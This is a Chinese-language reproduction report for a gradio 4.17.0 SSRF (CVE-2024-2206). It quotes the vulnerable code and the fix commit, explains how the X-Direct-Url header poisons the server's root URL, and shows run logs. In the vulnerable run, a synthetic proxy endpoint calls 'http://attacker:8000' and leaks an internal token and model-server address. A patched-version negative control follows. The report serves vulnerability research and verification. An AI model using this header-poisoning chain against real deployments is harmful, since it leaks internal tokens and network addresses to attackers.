# Hop 1 — gradio 4.17.0 SSRF (CVE-2024-2206)

## G1 双版本验证 — PASS (2026-11-19)

| 版本 | wheel | 结果 |
|---|---|---|
| 4.17.0（受影响） | 官方 PyPI wheel | exploit SUCCESS：`config["root"]` 被 `X-Direct-Url` 持久污染 → `/asset-feed-proxy` 服务端带 `X-Internal-Token` fetch 攻击者 URL → 令牌+模型服务器地址外泄 |
| 4.18.0（修复） | 官方 PyPI wheel | 同一 exploit FAIL（exit 2）：header 被无视，root 一次性从真实请求 URL 推导，监听器零请求 |

### 真实漏洞代码（官方 wheel，已逐行核实）

`gradio/routes.py`（/ 与 /config 路由）：

```python
root_path = (
    request.scope.get("root_path")
    or request.headers.get("X-Direct-Url")   # ← 攻击者可控
    or ""
)
config = app.get_blocks().config             # ← 4.17 无 deepcopy
config["root"] = route_utils.strip_url(root_path)  # ← 服务端持久污染
```

修复 commit `49d9c48537aa706bf72628e3640389470138bdc6`（4.18.0）：
1. 移除 `X-Direct-Url` 信任，root 改从 `request.url` 推导；
2. `config["root"]` 只在 `"root" not in config` 时设置一次（set-once）；
3. 新增 `add_root_url()` 在 predict/sse 输出时按请求读取 root——即修复后服务端消费方式变为不可污染的每请求推导。

### 重要机制发现（源码考古）

1. **4.17 的 `/proxy` 路由不可直接利用**：`build_proxy_request` 只认 `blocks.proxy_urls`（仅 `gr.load()` 填充），实测污染 root 后 `/proxy` 仍 400 "This URL cannot be proxied"。advisory 措辞（"adding of arbitrary URLs for proxying"）在 4.17 wheel 里对应的是污染→下游服务端消费者，不是 /proxy 直接放行。
2. **4.17 的污染是"最后写入者获胜"**：每次无头 `/` 或 `/config` 请求都会把 root 重置为 ""。所以下游消费者必须在污染后、下一次干净 /config 之前读取 root。参考 exploit 按此顺序：污染 → 立即触发 `/asset-feed-proxy`。
3. **`launch()` 会替换 `__exit__` 时的 app**（blocks.py `self.app = app`，`networking.start_server` 新建 App）：自定义路由必须在 launch 之后注册到 `demo.app`。

### 场景声明（PLAN.md §3 要求）

`/asset-feed-proxy`（面板代用户拉取资产 feed，附内网令牌头）为**合成部署场景**。该场景模仿的是 gradio 4.18+ 自身的服务端 root 消费方式（`add_root_url`）。污染原语 100% 来自官方 wheel。双版本差异完全落在官方修复点上（header 信任 + set-once 保护）。

## 运行记录

- 项目：`docker compose -p hop1-vuln`（17861）/ `-p hop1-fix`（17862）
- exploit：`attacker/reference_exploit.py`，退出码 0=成功利用、2=污染失败（修复版）、3=无 SSRF、4=战果不完整
- 4.17 运行输出（成功）：
  ```
  baseline /config root = ''
  after X-Direct-Url poison, /config root = 'http://attacker:8000'
  asset-feed-proxy returned {'assets': []}
  loot: token=chainv1tok-abc123 model_server=http://model-a:8090
  SUCCESS
  ```
- 4.18 运行输出（失败，负对照）：
  ```
  baseline /config root = 'http://hop1_panel_fix:7860'
  after X-Direct-Url poison, /config root = 'http://hop1_panel_fix:7860'
  FAIL: root not poisoned (patched wheel?)
  exit=2
  ```
